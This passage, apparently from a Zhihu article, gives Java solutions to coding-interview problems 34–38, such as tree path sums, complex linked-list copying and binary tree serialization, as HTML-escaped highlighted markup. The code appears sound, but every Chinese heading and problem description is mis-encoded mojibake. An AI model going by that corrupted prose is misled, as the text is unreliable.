class=\"o\">)</span>\n        <span class=\"n\">cutIndex</span><span class=\"o\">++;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">cutIndex</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">last</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">sequence</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">&lt;</span> <span class=\"n\">rootVal</span><span class=\"o\">)</span>\n            <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"n\">verify</span><span class=\"o\">(</span><span class=\"n\">sequence</span><span class=\"o\">,</span> <span class=\"n\">first</span><span class=\"o\">,</span> <span class=\"n\">cutIndex</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">)</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">verify</span><span class=\"o\">(</span><span class=\"n\">sequence</span><span class=\"o\">,</span> <span class=\"n\">cutIndex</span><span class=\"o\">,</span> <span class=\"n\">last</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><h2>34. äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/b736e784e3e34731af99065031301bca%3FtpId%3D13%26tqId%3D11177%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>è¾“å…¥ä¸€é¢—äºŒå‰æ ‘å’Œä¸€ä¸ªæ•´æ•°ï¼Œæ‰“å°å‡ºäºŒå‰æ ‘ä¸­ç»“ç‚¹å€¼çš„å’Œä¸ºè¾“å…¥æ•´æ•°çš„æ‰€æœ‰è·¯å¾„ã€‚è·¯å¾„å®šä¹‰ä¸ºä»æ ‘çš„æ ¹ç»“ç‚¹å¼€å§‹å¾€ä¸‹ä¸€ç›´åˆ°å¶ç»“ç‚¹æ‰€ç»è¿‡çš„ç»“ç‚¹å½¢æˆä¸€æ¡è·¯å¾„ã€‚</p><p>ä¸‹å›¾çš„äºŒå‰æ ‘æœ‰ä¸¤æ¡å’Œä¸º 22 çš„è·¯å¾„ï¼š10, 5, 7 å’Œ 10, 12</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-f0a6da5382120c68a9c0ce3a419cb167_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"350\" data-rawheight=\"371\" class=\"content_image\" width=\"350\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;350&#39; height=&#39;371&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"350\" data-rawheight=\"371\" class=\"content_image lazy\" width=\"350\" data-actualsrc=\"https://pic4.zhimg.com/v2-f0a6da5382120c68a9c0ce3a419cb167_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">private</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;&gt;</span> <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n\n<span class=\"kd\">public</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;&gt;</span> <span class=\"nf\">FindPath</span><span class=\"o\">(</span><span class=\"n\">TreeNode</span> <span class=\"n\">root</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">target</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">backtracking</span><span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">,</span> <span class=\"n\">target</span><span class=\"o\">,</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;());</span>\n    <span class=\"k\">return</span> <span class=\"n\">ret</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">backtracking</span><span class=\"o\">(</span><span class=\"n\">TreeNode</span> <span class=\"n\">node</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">target</span><span class=\"o\">,</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">path</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">node</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span><span class=\"o\">;</span>\n    <span class=\"n\">path</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">val</span><span class=\"o\">);</span>\n    <span class=\"n\">target</span> <span class=\"o\">-=</span> <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">val</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">target</span> <span class=\"o\">==</span> <span class=\"n\">0</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">left</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">right</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">ret</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;(</span><span class=\"n\">path</span><span class=\"o\">));</span>\n    <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>\n        <span class=\"n\">backtracking</span><span class=\"o\">(</span><span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">left</span><span class=\"o\">,</span> <span class=\"n\">target</span><span class=\"o\">,</span> <span class=\"n\">path</span><span class=\"o\">);</span>\n        <span class=\"n\">backtracking</span><span class=\"o\">(</span><span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">right</span><span class=\"o\">,</span> <span class=\"n\">target</span><span class=\"o\">,</span> <span class=\"n\">path</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n    <span class=\"n\">path</span><span class=\"o\">.</span><span class=\"na\">remove</span><span class=\"o\">(</span><span class=\"n\">path</span><span class=\"o\">.</span><span class=\"na\">size</span><span class=\"o\">()</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><h2>35. å¤æ‚é“¾è¡¨çš„å¤åˆ¶</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/f836b2c43afc4b35ad6adc41ec941dba%3FtpId%3D13%26tqId%3D11178%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>è¾“å…¥ä¸€ä¸ªå¤æ‚é“¾è¡¨ï¼ˆæ¯ä¸ªèŠ‚ç‚¹ä¸­æœ‰èŠ‚ç‚¹å€¼ï¼Œä»¥åŠä¸¤ä¸ªæŒ‡é’ˆï¼Œä¸€ä¸ªæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¦ä¸€ä¸ªç‰¹æ®ŠæŒ‡é’ˆæŒ‡å‘ä»»æ„ä¸€ä¸ªèŠ‚ç‚¹ï¼‰ï¼Œè¿”å›ç»“æœä¸ºå¤åˆ¶åå¤æ‚é“¾è¡¨çš„ headã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">RandomListNode</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">label</span><span class=\"o\">;</span>\n    <span class=\"n\">RandomListNode</span> <span class=\"n\">next</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n    <span class=\"n\">RandomListNode</span> <span class=\"n\">random</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n\n    <span class=\"n\">RandomListNode</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">label</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">label</span> <span class=\"o\">=</span> <span class=\"n\">label</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-29e7660af125d2231eb34293b1e78593_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"543\" data-rawheight=\"251\" class=\"origin_image zh-lightbox-thumb\" width=\"543\" data-original=\"https://pic4.zhimg.com/v2-29e7660af125d2231eb34293b1e78593_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;543&#39; height=&#39;251&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"543\" data-rawheight=\"251\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"543\" data-original=\"https://pic4.zhimg.com/v2-29e7660af125d2231eb34293b1e78593_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-29e7660af125d2231eb34293b1e78593_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><p>ç¬¬ä¸€æ­¥ï¼Œåœ¨æ¯ä¸ªèŠ‚ç‚¹çš„åé¢æ’å…¥å¤åˆ¶çš„èŠ‚ç‚¹ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-21ee57da0a87b0ac49f64b7bcf3435a3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1076\" data-rawheight=\"248\" class=\"origin_image zh-lightbox-thumb\" width=\"1076\" data-original=\"https://pic4.zhimg.com/v2-21ee57da0a87b0ac49f64b7bcf3435a3_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1076&#39; height=&#39;248&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1076\" data-rawheight=\"248\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1076\" data-original=\"https://pic4.zhimg.com/v2-21ee57da0a87b0ac49f64b7bcf3435a3_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-21ee57da0a87b0ac49f64b7bcf3435a3_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>ç¬¬äºŒæ­¥ï¼Œå¯¹å¤åˆ¶èŠ‚ç‚¹çš„ random é“¾æ¥è¿›è¡Œèµ‹å€¼ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-9f34494f6d9ebe2437da721da937ad22_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1062\" data-rawheight=\"256\" class=\"origin_image zh-lightbox-thumb\" width=\"1062\" data-original=\"https://pic3.zhimg.com/v2-9f34494f6d9ebe2437da721da937ad22_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1062&#39; height=&#39;256&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1062\" data-rawheight=\"256\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1062\" data-original=\"https://pic3.zhimg.com/v2-9f34494f6d9ebe2437da721da937ad22_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-9f34494f6d9ebe2437da721da937ad22_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>ç¬¬ä¸‰æ­¥ï¼Œæ‹†åˆ†ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-f665362398a87296e903b5048ebb0829_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1193\" data-rawheight=\"271\" class=\"origin_image zh-lightbox-thumb\" width=\"1193\" data-original=\"https://pic2.zhimg.com/v2-f665362398a87296e903b5048ebb0829_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1193&#39; height=&#39;271&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1193\" data-rawheight=\"271\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1193\" data-original=\"https://pic2.zhimg.com/v2-f665362398a87296e903b5048ebb0829_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-f665362398a87296e903b5048ebb0829_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">RandomListNode</span> <span class=\"nf\">Clone</span><span class=\"o\">(</span><span class=\"n\">RandomListNode</span> <span class=\"n\">pHead</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">pHead</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n    <span class=\"c1\">// æ’å…¥æ–°èŠ‚ç‚¹\n</span><span class=\"c1\"></span>    <span class=\"n\">RandomListNode</span> <span class=\"n\">cur</span> <span class=\"o\">=</span> <span class=\"n\">pHead</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">cur</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">RandomListNode</span> <span class=\"n\">clone</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">RandomListNode</span><span class=\"o\">(</span><span class=\"n\">cur</span><span class=\"o\">.</span><span class=\"na\">label</span><span class=\"o\">);</span>\n        <span class=\"n\">clone</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">cur</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n        <span class=\"n\">cur</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">clone</span><span class=\"o\">;</span>\n        <span class=\"n\">cur</span> <span class=\"o\">=</span> <span class=\"n\">clone</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"c1\">// å»ºç«‹ random é“¾æ¥\n</span><span class=\"c1\"></span>    <span class=\"n\">cur</span> <span class=\"o\">=</span> <span class=\"n\">pHead</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">cur</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">RandomListNode</span> <span class=\"n\">clone</span> <span class=\"o\">=</span> <span class=\"n\">cur</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">cur</span><span class=\"o\">.</span><span class=\"na\">random</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n            <span class=\"n\">clone</span><span class=\"o\">.</span><span class=\"na\">random</span> <span class=\"o\">=</span> <span class=\"n\">cur</span><span class=\"o\">.</span><span class=\"na\">random</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n        <span class=\"n\">cur</span> <span class=\"o\">=</span> <span class=\"n\">clone</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"c1\">// æ‹†åˆ†\n</span><span class=\"c1\"></span>    <span class=\"n\">cur</span> <span class=\"o\">=</span> <span class=\"n\">pHead</span><span class=\"o\">;</span>\n    <span class=\"n\">RandomListNode</span> <span class=\"n\">pCloneHead</span> <span class=\"o\">=</span> <span class=\"n\">pHead</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">cur</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">RandomListNode</span> <span class=\"n\">next</span> <span class=\"o\">=</span> <span class=\"n\">cur</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n        <span class=\"n\">cur</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">next</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n        <span class=\"n\">cur</span> <span class=\"o\">=</span> <span class=\"n\">next</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">pCloneHead</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>36. äºŒå‰æœç´¢æ ‘ä¸åŒå‘é“¾è¡¨</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/947f6eb80d944a84850b0538bf0ec3a5%3FtpId%3D13%26tqId%3D11179%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>è¾“å…¥ä¸€æ£µäºŒå‰æœç´¢æ ‘ï¼Œå°†è¯¥äºŒå‰æœç´¢æ ‘è½¬æ¢æˆä¸€ä¸ªæ’åºçš„åŒå‘é“¾è¡¨ã€‚è¦æ±‚ä¸èƒ½åˆ›å»ºä»»ä½•æ–°çš„ç»“ç‚¹ï¼Œåªèƒ½è°ƒæ•´æ ‘ä¸­ç»“ç‚¹æŒ‡é’ˆçš„æŒ‡å‘ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-eaf36964f9981bf1193eac8bbbae2a10_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"710\" data-rawheight=\"242\" class=\"origin_image zh-lightbox-thumb\" width=\"710\" data-original=\"https://pic1.zhimg.com/v2-eaf36964f9981bf1193eac8bbbae2a10_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;710&#39; height=&#39;242&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"710\" data-rawheight=\"242\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"710\" data-original=\"https://pic1.zhimg.com/v2-eaf36964f9981bf1193eac8bbbae2a10_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-eaf36964f9981bf1193eac8bbbae2a10_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">private</span> <span class=\"n\">TreeNode</span> <span class=\"n\">pre</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n<span class=\"kd\">private</span> <span class=\"n\">TreeNode</span> <span class=\"n\">head</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n\n<span class=\"kd\">public</span> <span class=\"n\">TreeNode</span> <span class=\"nf\">Convert</span><span class=\"o\">(</span><span class=\"n\">TreeNode</span> <span class=\"n\">root</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">inOrder</span><span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">);</span>\n    <span class=\"k\">return</span> <span class=\"n\">head</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">inOrder</span><span class=\"o\">(</span><span class=\"n\">TreeNode</span> <span class=\"n\">node</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">node</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span><span class=\"o\">;</span>\n    <span class=\"n\">inOrder</span><span class=\"o\">(</span><span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">left</span><span class=\"o\">);</span>\n    <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">left</span> <span class=\"o\">=</span> <span class=\"n\">pre</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">pre</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"n\">pre</span><span class=\"o\">.</span><span class=\"na\">right</span> <span class=\"o\">=</span> <span class=\"n\">node</span><span class=\"o\">;</span>\n    <span class=\"n\">pre</span> <span class=\"o\">=</span> <span class=\"n\">node</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">head</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"n\">head</span> <span class=\"o\">=</span> <span class=\"n\">node</span><span class=\"o\">;</span>\n    <span class=\"n\">inOrder</span><span class=\"o\">(</span><span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">right</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><h2>37. åºåˆ—åŒ–äºŒå‰æ ‘</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/cf7e25aa97c04cc1a68c8f040e71fb84%3FtpId%3D13%26tqId%3D11214%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>è¯·å®ç°ä¸¤ä¸ªå‡½æ•°ï¼Œåˆ†åˆ«ç”¨æ¥åºåˆ—åŒ–å’Œååºåˆ—åŒ–äºŒå‰æ ‘ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">private</span> <span class=\"n\">String</span> <span class=\"n\">deserializeStr</span><span class=\"o\">;</span>\n\n<span class=\"kd\">public</span> <span class=\"n\">String</span> <span class=\"nf\">Serialize</span><span class=\"o\">(</span><span class=\"n\">TreeNode</span> <span class=\"n\">root</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">root</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"s\">&#34;#&#34;</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">val</span> <span class=\"o\">+</span> <span class=\"s\">&#34; &#34;</span> <span class=\"o\">+</span> <span class=\"n\">Serialize</span><span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">left</span><span class=\"o\">)</span> <span class=\"o\">+</span> <span class=\"s\">&#34; &#34;</span> <span class=\"o\">+</span> <span class=\"n\">Serialize</span><span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">right</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">public</span> <span class=\"n\">TreeNode</span> <span class=\"nf\">Deserialize</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">str</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">deserializeStr</span> <span class=\"o\">=</span> <span class=\"n\">str</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"n\">Deserialize</span><span class=\"o\">();</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"n\">TreeNode</span> <span class=\"nf\">Deserialize</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">deserializeStr</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">()</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">index</span> <span class=\"o\">=</span> <span class=\"n\">deserializeStr</span><span class=\"o\">.</span><span class=\"na\">indexOf</span><span class=\"o\">(</span><span class=\"s\">&#34; &#34;</span><span class=\"o\">);</span>\n    <span class=\"n\">String</span> <span class=\"n\">node</span> <span class=\"o\">=</span> <span class=\"n\">index</span> <span class=\"o\">==</span> <span class=\"o\">-</span><span class=\"n\">1</span> <span class=\"o\">?</span> <span class=\"n\">deserializeStr</span> <span class=\"o\">:</span> <span class=\"n\">deserializeStr</span><span class=\"o\">.</span><span class=\"na\">substring</span><span class=\"o\">(</span><span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">index</span><span class=\"o\">);</span>\n    <span class=\"n\">deserializeStr</span> <span class=\"o\">=</span> <span class=\"n\">index</span> <span class=\"o\">==</span> <span class=\"o\">-</span><span class=\"n\">1</span> <span class=\"o\">?</span> <span class=\"s\">&#34;&#34;</span> <span class=\"o\">:</span> <span class=\"n\">deserializeStr</span><span class=\"o\">.</span><span class=\"na\">substring</span><span class=\"o\">(</span><span class=\"n\">index</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"s\">&#34;#&#34;</span><span class=\"o\">))</span>\n        <span class=\"k\">return</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">val</span> <span class=\"o\">=</span> <span class=\"n\">Integer</span><span class=\"o\">.</span><span class=\"na\">valueOf</span><span class=\"o\">(</span><span class=\"n\">node</span><span class=\"o\">);</span>\n    <span class=\"n\">TreeNode</span> <span class=\"n\">t</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">TreeNode</span><span class=\"o\">(</span><span class=\"n\">val</span><span class=\"o\">);</span>\n    <span class=\"n\">t</span><span class=\"o\">.</span><span class=\"na\">left</span> <span class=\"o\">=</span> <span class=\"n\">Deserialize</span><span class=\"o\">();</span>\n    <span class=\"n\">t</span><span class=\"o\">.</span><span class=\"na\">right</span> <span class=\"o\">=</span> <span class=\"n\">Deserialize</span><span class=\"o\">();</span>\n    <span class=\"k\">return</span> <span class=\"n\">t</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>38. å­—ç¬¦ä¸²çš„æ’åˆ—</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/fe6b651b66ae47d7acce78ffdd9a96c7%3FtpId%3D13%26tqId%3D11180%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒæŒ‰å­—å…¸åºæ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²ä¸­å­—ç¬¦çš„æ‰€æœ‰æ’åˆ—ã€‚ä¾‹å¦‚è¾“å…¥å­—ç¬¦ä¸² abcï¼Œåˆ™æ‰“å°å‡ºç”±å­—ç¬¦ a, b, c æ‰€èƒ½æ’åˆ—å‡ºæ¥çš„æ‰€æœ‰å­—ç¬¦ä¸² abc, acb, bac, bca, cab å’Œ cbaã€‚</p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">private</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">String</span><span class=\"o\">&gt;</span> <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n\n<span class=\"kd\">public</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span 